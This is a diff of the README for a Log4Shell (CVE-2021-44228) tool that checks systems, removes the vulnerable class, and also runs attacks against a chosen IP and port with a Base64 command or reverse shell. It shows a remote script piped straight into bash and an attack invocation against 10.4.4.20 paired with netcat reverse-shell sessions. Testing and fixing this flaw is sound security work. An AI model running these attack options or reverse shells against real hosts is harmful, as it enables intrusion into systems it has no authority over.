@@ -5,23 +5,39 @@ Log4j - Multitool. Find &amp; fix possible CVE-2021-44228 vulneraries - provides
 
 # Features
 
-- check your System for CVE-2021-44228 vulneraries
-- fix yout system by deleting log4j java class
-- you can run a dummy spring boot server for testing the exploit by yourself (https://github.com/christophetd/log4shell-vulnerable-app)
-- you can run a attack against a wished IP-Port and include a Base64 Command / Or A simple Reverse Shell
-- full ip-range scanning by https://github.com/fullhunt/log4j-scan
+- Check your Linux/Mac/BSD and Windows System for CVE-2021-44228 vulneraries
+- Fix your system by deleting log4j java class / or setting some enviroment variables 
+- Proof of Concept: you can run a dummy spring boot server for testing the exploit by yourself (https://github.com/christophetd/log4shell-vulnerable-app)
+- You can run a attack against a wished IP-Port and include a Base64 Command / Or A simple Reverse Shell
+- Full ip-range scanning by https://github.com/fullhunt/log4j-scan
 
-### This script is easy to run on your linux distribution by:
+# How to Run on Linux/Mac/BSD:
+
+### Requirements:
+
+- https://docs.docker.com/get-docker/
+- Debian / Ubuntu: ```apt update ; apt install java python3 pip bash curl```
+- OpenSuse: ```zypper ref ; zypper in java python3 pip bash curl```
+- Redhead-Linux / CentOS: ```yum clean; yum install java python3 pip bash curl```
+- BSD pkg: ```pkg install java python3 pip curl```
+- Mac OS (Brew): ```/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" ; brew install java python3 pip curl```
+
+### Quick check your system with this oneliner:
 
 ```bash
 wget https://raw.githubusercontent.com/suuhm/log4shell4shell/main/log4shell4shell.sh -qO- | bash -s -- --check-system
 ```
 
-#### Run a sample attack against IP: 10.4.4.20 Port 8080 and additionally a Reverse Proxy Shell :
+### More Options
+#### Run a sample attack against IP: 10.4.4.20 Port 8080 loginpage and additionally a Reverse Proxy Shell :
 
 ```bash
-./l4s4s.sh --run-attack 10.4.4.20:8080 -e
+git clone https://github.com/suuhm/log4shell4shell ; cd log4shell4shell
+mv log4shell4shell.sh l4s4s.sh && chmod +x l4s4s.sh
+./l4s4s.sh --run-attack http://10.4.4.20:8080/login.php -e
 ```
+Run ```screen -r l4s4s-ldap-srv``` and/or ```screen -r l4s4s-nc-rsh``` to view some attacking infos in Exploit-Server shell: 
+
 
 #### Run a full scan  IP: 10.4.4.20 Port 8080 and additionally a try all tests :
 
@@ -30,7 +46,7 @@ wget https://raw.githubusercontent.com/suuhm/log4shell4shell/main/log4shell4shel
 ```
 
 
-### Options
+### All available Options
 
 ```bash
 _|                            _|  _|              _|                  _|  _|  _|  _|              _|                  _|  _|
@@ -54,6 +70,11 @@ Usage: ./l4s4s.sh [OPTIONS] <IP:PORT|COMMAND>
                         --python-scan <command>
 
 ```
+
+# How to Run on Windows x86 / x64:
+
+Just run in Powershell: ``` .\set_windows_fix.ps1 ```
+
 
 ### This script is alpha! So please let me know if you have some issues
 
